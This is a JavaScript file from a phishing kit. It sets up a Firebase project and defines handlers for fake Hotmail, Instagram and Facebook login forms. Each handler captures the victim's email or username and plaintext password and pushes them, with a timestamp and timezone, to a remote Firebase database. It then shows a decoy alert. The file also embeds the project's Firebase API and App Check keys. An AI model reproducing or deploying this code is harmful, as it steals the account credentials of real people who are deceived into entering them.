// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyBxZhMLXl8c8SbtzMuM7rC72GF3oKJJjP0",
  authDomain: "arabstarsofasia.firebaseapp.com",
  databaseURL: "https://arabstarsofasia-default-rtdb.firebaseio.com",
  projectId: "arabstarsofasia",
  storageBucket: "arabstarsofasia.appspot.com",
  messagingSenderId: "296529687189",
  appId: "1:296529687189:web:0f8dd8410bf0e673b1219c",
  measurementId: "G-YSR0QRR6DE",
};

firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
console.log(appCheck);
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

function showAlert() {
  document.getElementById("customAlert").style.display = "block";
}

function closeAlert() {
  document.getElementById("customAlert").style.display = "none";
}

function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Hotmail";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("hm-pass").value = "";
      return false;
    }, 2000);
  }
}

function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function login() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      var errorMessage = error.message;
      alert("Error: " + errorMessage);
    });

  var email = document.getElementById("fb-email").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(); // Show custom modal
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  }
}
